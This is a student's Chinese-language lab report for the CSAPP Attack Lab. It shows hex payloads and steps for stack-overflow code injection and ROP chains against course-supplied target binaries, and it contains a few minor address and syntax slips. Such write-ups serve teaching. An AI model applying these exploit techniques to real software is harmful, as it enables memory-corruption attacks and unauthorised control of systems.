# CSAPP：Attack Lab 实验报告
23307110043 孙天宇

### target170
### cookie: 0x2236c49a
<br>

## 实验目的
![alt text](image.png)
<br>

## 实验步骤
### 准备阶段：
- 访问`http://10.176.122.240:15513/`获取`targetk.tar`压缩文件
- 输入`tar -xvf target7.tar`命令解压
- 使用`objdump -d ctarget > ctarget.asm`，`objdump -d rtarget > rtarget.asm`命令对ctarget以及rtarget进行反汇编，得到ctarget.asm和rtarget.asm两个汇编文件
- 使用`gdb`进行调试

### phase1(phase1.txt)：
### phase1.txt
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
5c 17 40 00 00 00 00 00
```
### 解题思路：
- 1. 由此可知缓冲区大小为0x38=56字节，且可知`getbuf`函数存在栈溢出漏洞
![alt text](image-1.png)

- 2. 构造输入，先填满缓冲区（先任意放置56个16进制数），最后8个数使得返回地址被覆盖为`touch1`的地址（由图可知为40175c，此图所在文件`ctarget.asm`也包含了后续`touch2`和`touch3`的地址）
![alt text](image-2.png)

- 3. 运行命令：`./hex2raw < phase1.txt | ./ctarget`，由此即完成phase1的攻击，成功结果如下图：
![alt text](image-3.png)

<br>

### phase2(phase2.txt)：
### phase2.txt
```
48 c7 c7 9a c4 36 22
68 88 17 40 00
c3  
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
f8 63 61 55 00 00 00 00
```
### 解题思路：
- 1. 写汇编代码，将cookie值（`0x2236c49a`）存入`%rdi`，同时将touch2的地址push入栈
`result2_1.s`
    ```
    movq $0x2236c49a,%rdi
    pushq $0x00401788
    retq
    ```

- 2. 使用代码`gcc -c result2_1.s` `objdump -d result2_1.o > result2_2.txt`得到二进制表示，生成文件`result2_2.txt`
![alt text](image-4.png)

- 3. 使用如下命令获取栈顶地址：
        ```
        gdb ctarget
        (gdb)b getbuf
        (gdb)r
        (gdb)print $rsp
        ```

- 4. 前13个字节为注入的代码，任意补充56-13=43个数据填满56个字节，加上栈顶地址（0x556163f8），存入`phase2.txt`

- 5. 运行命令：`./hex2raw < phase2.txt | ./ctarget`，由此即完成phase2的攻击，成功结果如下图：
![alt text](image-5.png)

### phase3(phase3.txt)：
### phase3.txt
```
48 c7 c7 3b 64 61 55
68 99 18 40 00
c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00
f8 63 61 55 00 00 00 00
00 00 00
32 32 33 36 63 34 39 61 00  
```
### 解题思路：
- 1. 获取栈顶地址（0x55616430），计算减去缓冲区大小（0x38）后的地址（0x5566163f8）（此为缓冲区起始地址）

- 2. 选择偏移量（此处选择11字节），计算偏移后地址（0x5561643b）存入`%rdi`中。如phase2生成`result3_2.txt`文件
        ```
        result3_1.s

        movq $0x5561643b,%rdi
        pushq 0x401899
        retq
        ```
        ![alt text](image-6.png)

- 3. 如phase2，写入`phase3.txt`，中间放入缓冲区起始地址，然后补全11-8=3个字节，最后一行写入按照ASCII码对应的到的cookie值和结束符，即得完整的答案。
<br>
整体布局：注入代码 + 填充 + 缓冲区起始地址 + 字符串

- 4. 运行命令：`./hex2raw < phase3.txt | ./ctarget`，由此即完成phase3的攻击，成功结果如下图：
![alt text](image-7.png)

### phase4(phase4.txt)：
### phase4.txt
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
39 19 40 00 00 00 00 00
9a c4 36 22 00 00 00 00
4d 19 40 00 00 00 00 00
88 17 40 00 00 00 00 00
```
### 解题思路：
- 结构：填充缓冲区（56个字节），接ROP链：
  - gadget1地址(0x401939) - pop %rax; ret
  - cookie值(0x2236c49a)
  - gadget2地址(0x40194d) - mov %rax,%rdi; ret
  - touch2函数地址(0x401788)
  - gadget地址可在`rtarget.asm`文件中通过搜索相应命令对应的机器码获得
- 运行命令：`./hex2raw < phase4.txt | ./rtarget`，由此即完成phase4的攻击，成功结果如下图：
![alt text](image-8.png)

### phase5(phase5.txt)：
### phase5.txt
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
95 19 40 00 00 00 00 00
74 19 40 00 00 00 00 00
4d 19 40 00 00 00 00 00
99 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
32 32 33 36 63 34 39 61 00 
```
### 解题思路：
- 1. 先填充56字节破坏栈，紧接着是`movq %rsp,%rax`，将当前栈顶位置存`%rax`.这段代码的位置是`0x401995`
- 2. 接着 `add $0x37,%al` ，给 `%rax` 加值`0x37`，得到栈顶往底部`0x37`（十进制55）位置处。这段代码位置是`0x401974`
- 3. 然后将`%rax`值传入函数的参数`%rdi`，代码位置是`0x40194d`
- 4. 然后跳转到`touch3`函数。这段代码位置是`0x401899`
- 5. 在一开始调rsp加存入字符串cookie（转换成对应的ASCII码），并在其前面填充字节使其地址与保存的栈顶地址相差55个字节，共要填充 (55-3×8)=31 个字节。
- 以上地址的获取方式为：对照说明文档中的表格查询命令对应的机器码，然后在`rtarget.asm`文件中搜索相应机器码，即可获得地址
![alt text](image-9.png)
- 运行命令：`./hex2raw < phase5.txt | ./rtarget`，由此即完成phas5的攻击，成功结果如下图：
![alt text](image-10.png)